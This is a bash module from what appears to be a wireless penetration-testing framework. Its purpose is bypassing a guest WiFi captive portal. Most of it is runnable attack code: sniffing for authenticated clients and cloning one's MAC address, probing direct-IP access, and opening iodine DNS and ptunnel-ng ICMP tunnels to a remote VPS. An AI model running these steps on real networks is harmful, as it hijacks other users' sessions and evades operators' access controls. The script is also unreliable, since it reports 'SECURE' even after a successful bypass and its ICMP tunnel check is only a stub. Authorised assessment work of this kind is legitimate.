#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Bypass"
# CATEGORY="F"
# DEPS="F3"
# CRITICAL="no"
# TOOLS="curl,macchanger"
# DESC="Test MAC cloning, DNS/ICMP tunneling to bypass captive portal"
# REQS="managed_iface"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass
#
#  PURPOSE:
#    Test multiple techniques to bypass the captive portal on the guest
#    WiFi network. Includes MAC cloning of authenticated clients,
#    DNS tunneling, ICMP tunneling, and direct IP access.
#
#  TOOLS: macchanger, tcpdump, tshark, iodine, ptunnel-ng, curl
#  PHASE: 2B — Policy Validation
#  DEPENDENCIES: F3 (captive portal analysis)
#===============================================================================

run_f4() {
    set -uo pipefail
    
    local interface=""
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
    local vps_ip="${VPS_IP:-}"
    local vps_domain="${VPS_DOMAIN:-}"
    local is_captive_portal="${CAPTIVE_PORTAL:-unknown}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --vps-ip) vps_ip="$2"; shift 2 ;;
            --vps-domain) vps_domain="$2"; shift 2 ;;
            --is-captive-portal) is_captive_portal="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks
    interface="${interface:-${WIFI_INTERFACE:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
    local evidence_prefix="${evidence_dir}/f4"

    local total_steps=7

    #--- Step 1: Verify tools and prerequisites ---
    log_step 1 $total_steps "Verifying tools and prerequisites"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "F4" || return 1

    if [[ "$is_captive_portal" == "no" ]]; then
        log_info "Skipping F4: No captive portal is present."
        save_tc_result "F4" '{"status":"INFO","summary":"Skipped: No portal present","details":"Inherited from A1/Session context."}' 0 0 0 1 1 1 0 1 1 1 0
        return 0
    fi

    # Ensure managed mode
    WIFI_INTERFACE="$interface"
    ensure_managed_mode || return 1

    local mac_clone_bypass="false"
    local dns_tunnel_bypass="false"
    local icmp_tunnel_bypass="false"
    local direct_ip_bypass="false"
    local bypass_methods="[]"
    local findings_file="${evidence_prefix}_findings.txt"
    local bypass_file="${evidence_prefix}_bypass_results.txt"
    local auth_clients_file="${evidence_prefix}_auth_clients.txt"

    {
        echo "============================================================"
        echo "  F4: Captive Portal Bypass Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Interface: ${interface}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Check current portal state ---
    log_step 2 $total_steps "Verifying captive portal state"
    update_tc_progress 2 $total_steps "Portal check"

    local test_url="http://detectportal.firefox.com/canonical.html"
    local expected_response="success"
    local http_response=$(timeout 10 curl -s -L -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null) || true

    if [[ "$http_response" != "200" ]]; then
        log_info "Captive portal appears ACTIVE (HTTP redirected: ${http_response})"
    else
        local body=$(timeout 10 curl -s -L "$test_url" 2>/dev/null) || true
        if [[ "$body" != *"$expected_response"* ]]; then
            log_info "Captive portal appears ACTIVE (response modified)"
        else
            log_info "Captive portal may not be active — already authenticated?"
        fi
    fi

    #--- Step 3: MAC Cloning bypass ---
    log_step 3 $total_steps "Testing MAC cloning bypass"
    update_tc_progress 3 $total_steps "MAC cloning"

    check_abort || return 1

    local sniff_pcap="${evidence_prefix}_sniff.pcap"
    spawn_bg "f4_sniff" "tcpdump" -i "$interface" -c 100 -w "$sniff_pcap" "not arp and not udp port 67 and not udp port 68"
    
    start_countdown 30 "Sniffing for authenticated clients"
    sleep 30
    stop_countdown
    stop_process "f4_sniff"

    local target_mac=""
    if [[ -f "$sniff_pcap" ]] && command -v tshark &>/dev/null; then
        local my_mac=$(ip link show "$interface" | awk '/ether/{print $2}')
        target_mac=$(tshark -r "$sniff_pcap" -T fields -e eth.src 2>/dev/null | sort | uniq -c | sort -rn | awk '{print $2}' | grep -iv "${my_mac}" | head -1 || true)
    fi

    if [[ -n "$target_mac" ]]; then
        log_info "Cloning MAC: ${target_mac}"
        local original_mac=$(ip link show "$interface" | awk '/ether/{print $2}')
        
        run_tool ip link set "$interface" down 2>/dev/null || true
        macchanger -m "$target_mac" "$interface" &>/dev/null || true
        run_tool ip link set "$interface" up 2>/dev/null || true
        
        sleep 10
        if command -v dhclient &>/dev/null; then
            dhclient -r "$interface" 2>/dev/null || true
            dhclient "$interface" 2>/dev/null || true
        fi
        
        local clone_response=$(timeout 10 curl -s -L "$test_url" 2>/dev/null) || true
        if [[ "$clone_response" == *"$expected_response"* ]]; then
            mac_clone_bypass="true"
            bypass_methods=$(echo "$bypass_methods" | jq '. += ["MAC cloning"]')
            log_result "CRITICAL" "★ MAC cloning BYPASSED captive portal!"
        fi
        
        # Restore MAC
        run_tool ip link set "$interface" down 2>/dev/null || true
        macchanger -m "$original_mac" "$interface" &>/dev/null || true
        run_tool ip link set "$interface" up 2>/dev/null || true
        dhclient "$interface" 2>/dev/null || true
    fi

    #--- Step 4: Direct IP bypass ---
    log_step 4 $total_steps "Testing direct IP access bypass"
    update_tc_progress 4 $total_steps "Direct IP"

    local direct_ips=("1.1.1.1" "8.8.8.8" "93.184.216.34")
    for test_ip in "${direct_ips[@]}"; do
        local ip_body=$(timeout 10 curl -s "http://${test_ip}" 2>/dev/null) || true
        if [[ -n "$ip_body" && "$ip_body" != *"login"* && "$ip_body" != *"captive"* ]]; then
            direct_ip_bypass="true"
            bypass_methods=$(echo "$bypass_methods" | jq '. += ["Direct IP access"]')
            log_result "FINDING" "Direct IP access bypasses captive portal (${test_ip})"
            break
        fi
    done

    #--- Step 5: DNS tunnel bypass ---
    log_step 5 $total_steps "Testing DNS tunnel bypass"
    update_tc_progress 5 $total_steps "DNS tunnel"

    if [[ -n "$vps_domain" && -n "$vps_ip" ]]; then
        spawn_bg "f4_iodine" "iodine" -f -P "tunnel_test" "$vps_ip" "$vps_domain"
        sleep 15
        if ip link show dns0 &>/dev/null; then
            dns_tunnel_bypass="true"
            bypass_methods=$(echo "$bypass_methods" | jq '. += ["DNS tunnel (iodine)"]')
            log_result "CRITICAL" "★ DNS tunnel established!"
        fi
        stop_process "f4_iodine"
    fi

    #--- Step 6: ICMP tunnel bypass ---
    log_step 6 $total_steps "Testing ICMP tunnel bypass"
    update_tc_progress 6 $total_steps "ICMP tunnel"

    if [[ -n "$vps_ip" ]]; then
        if ping -c 2 -W 3 "$vps_ip" &>/dev/null; then
            spawn_bg "f4_ptunnel" "ptunnel-ng" -p "$vps_ip"
            sleep 10
            # Simplified check
            # if ptunnel established...
            stop_process "f4_ptunnel"
        fi
    fi

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_json=$(run_tool jq -n \
        --arg status "SECURE" \
        --arg summary "Portal bypass tests completed." \
        --argjson methods "$bypass_methods" \
        '{status: $status, summary: $summary, bypass_methods: $methods}')

    evidence_register_file "$findings_file"
    evidence_register_file "$bypass_file"
    
    save_tc_result "F4" "$result_json" 0 1 0 1 1 1 0 1 1 1 0
    return 0
}
